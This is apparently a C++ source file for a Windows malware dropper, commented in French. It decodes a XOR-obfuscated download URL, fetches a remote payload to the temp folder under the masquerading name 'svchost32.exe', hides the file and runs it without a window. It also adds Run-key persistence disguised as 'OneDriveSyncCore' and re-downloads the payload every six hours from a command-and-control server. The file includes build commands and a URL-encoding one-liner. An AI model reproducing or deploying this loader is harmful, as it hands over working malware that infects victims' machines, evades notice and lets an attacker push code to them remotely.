// language: C++17, file: src/tools/09_dropper.cpp, target: Windows 10/11, MSVC/MinGW
// Dropper - URL XOR-obfusquee, download urlmon, exec cache, persistance Run
// Usage: dropper.exe [url_en_clair]   (defaut: payload XOR 0x5A sur 127.0.0.1:8080/p.exe)
// MinGW: g++ -O2 -std=c++17 09_dropper.cpp -o drop.exe -lurlmon -ladvapi32
#include <windows.h>
#include <urlmon.h>
#include <cstdio>
#include <cstring>
#include <string>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "advapi32.lib")

// "http://127.0.0.1:8080/p.exe" XOR 0x5A - gen ton URL:
// python3 -c "print(','.join('0x%02X'%(ord(c)^0x5A) for c in input()))"
static const BYTE kUrl[] = {
    0x32,0x2E,0x2E,0x2A,0x60,0x75,0x75,0x6B,0x68,0x6D,0x74,0x6A,
    0x74,0x6A,0x74,0x6B,0x60,0x62,0x6A,0x62,0x6A,0x75,0x2A,0x74,
    0x3F,0x22,0x3F
};

static std::string DecodeUrl() {
    std::string s;
    for (BYTE b : kUrl) s += (char)(b ^ 0x5A);
    return s;
}

static void Persist(const char* name) {
    char path[MAX_PATH]; GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY k;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        RegSetValueExA(k, name, 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
        RegCloseKey(k);
    }
}

static bool DropAndExec(const char* url) {
    char temp[MAX_PATH]; GetEnvironmentVariableA("TEMP", temp, MAX_PATH);
    std::string dst = std::string(temp) + "\\svchost32.exe";
    // URLDownloadToFileA: honore le cache IE, prox systeme
    if (FAILED(URLDownloadToFileA(NULL, url, dst.c_str(), 0, NULL))) return false;
    SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN);

    STARTUPINFOA si{}; si.cb = sizeof(si); si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESHOWWINDOW;
    PROCESS_INFORMATION pi{};
    if (!CreateProcessA(dst.c_str(), NULL, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, temp, &si, &pi)) return false;
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    return true;
}

int main(int argc, char** argv) {
    FreeConsole();
    std::string url = argc > 1 ? argv[1] : DecodeUrl();
    Persist("OneDriveSyncCore");

    // boucle de secours: retente toutes les 30 min si le C2 etait down,
    // et re-recupere le payload toutes les 6 h (mise a jour a distance)
    for (;;) {
        DropAndExec(url.c_str());
        Sleep(6 * 3600 * 1000);
    }
    return 0;
}
